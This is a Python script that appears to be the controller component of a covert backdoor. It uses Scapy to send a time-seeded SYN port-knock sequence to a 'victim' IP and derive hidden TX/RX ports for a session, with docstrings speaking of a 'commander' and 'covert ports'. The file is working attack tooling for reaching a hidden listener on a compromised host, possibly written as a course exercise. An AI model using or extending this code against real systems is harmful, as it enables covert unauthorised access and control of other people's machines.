import random
import time
import struct
import socket
from scapy.all import IP, TCP, send

class PortKnocker:
    """
    Standalone Port Knocker for session initiation.
    Requirement: The commander must port-knock on the victim to initiate a session. 
    """
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.knocks = []
        self.tx_port = None
        self.rx_port = None

    def _generate_sequence(self):
        """
        Generates deterministic, unique ports based on IP and time. 
        """
        # 1. Correct IP to 32-bit conversion using socket
        try:
            ip_u32 = struct.unpack("!I", socket.inet_aton(self.target_ip))[0]
        except socket.error:
            print(f"[!] Invalid IP address: {self.target_ip}")
            return False

        # 2. Time-based synchronization (1-minute window) 
        time_step = int(time.time() / 60)
        seed = ip_u32 ^ time_step
        
        rng = random.Random(seed)
        
        # 3. Prevent duplicate knock ports using rng.sample
        self.knocks = rng.sample(range(1024, 65535), 3)
        
        # 4. Avoid TX/RX collisions with knock ports or each other 
        while True:
            self.tx_port = rng.randint(1024, 65535)
            self.rx_port = rng.randint(1024, 65535)

            if (self.tx_port not in self.knocks and 
                self.rx_port not in self.knocks and 
                self.tx_port != self.rx_port):
                break
        return True

    def execute_knock(self):
        """
        Sends the SYN sequence using Scapy with improved reliability. 
        """
        if not self._generate_sequence():
            return None, None
            
        print(f"[*] Targeting: {self.target_ip}")
        print(f"[*] Sequence: {self.knocks}")
        print(f"[*] Covert Ports: TX={self.tx_port}, RX={self.rx_port} ")

        for port in self.knocks:
            # Crafting the SYN packet 
            pkt = IP(dst=self.target_ip)/TCP(sport=54321, dport=port, flags="S")
            
            # Send duplicate packets with short delay for reliability
            send(pkt, verbose=False)
            time.sleep(0.05)
            send(pkt, verbose=False)
            
            # Delay between moving to the next port in the sequence
            time.sleep(0.3)
            
        print("[+] Knock sequence complete. Session ready.")
        return self.tx_port, self.rx_port

# Example of how you would call this in your Commander menu: [cite: 8]
# knocker = PortKnocker("192.168.1.10")
# tx, rx = knocker.execute_knock()
